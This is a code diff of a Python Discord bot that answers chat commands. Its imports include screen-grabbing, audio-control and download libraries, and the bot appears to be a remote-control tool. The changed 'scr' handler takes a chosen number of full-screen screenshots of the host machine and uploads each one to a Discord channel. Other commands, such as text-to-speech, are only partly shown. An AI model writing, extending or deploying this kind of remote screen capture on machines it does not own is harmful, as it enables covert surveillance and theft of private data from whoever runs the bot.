@@ -5,7 +5,6 @@ from PIL import ImageGrab, Image, ImageTk
 import os 
 import discord
 import asyncio
-import getpass
 import requests
 import imageio
 import pyautogui
@@ -21,7 +20,6 @@ from urllib.request import urlretrieve
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL
 import ctypes
-import subprocess
 
 load_dotenv()
 
@@ -135,10 +133,18 @@ class MyClient(discord.Client):
             #take a screenshot
             if f'{message.content}' == 'scr':
                 # Take screenshot
-                im = ImageGrab.grab()
-                im.save('screenshot.png')
-                await message.channel.send(file=discord.File('screenshot.png'))
-                os.remove('screenshot.png')
+                #repeat a user defined amount
+                await message.channel.send('Please enter the amount of screenshots you would like to take')
+                def check(m):
+                    return m.author == message.author and m.channel == message.channel
+                msg = await client.wait_for('message', check=check)
+                amount = int(msg.content)
+                for i in range(amount):
+                    im = ImageGrab.grab()
+                    im.save('screenshot.png')
+                    await message.channel.send(file=discord.File('screenshot.png'))
+                    os.remove('screenshot.png')
+                    time.sleep(1)
             #text to speech
             if f'{message.content}' == 'tts':
                 # Check if the message is from the bot itself
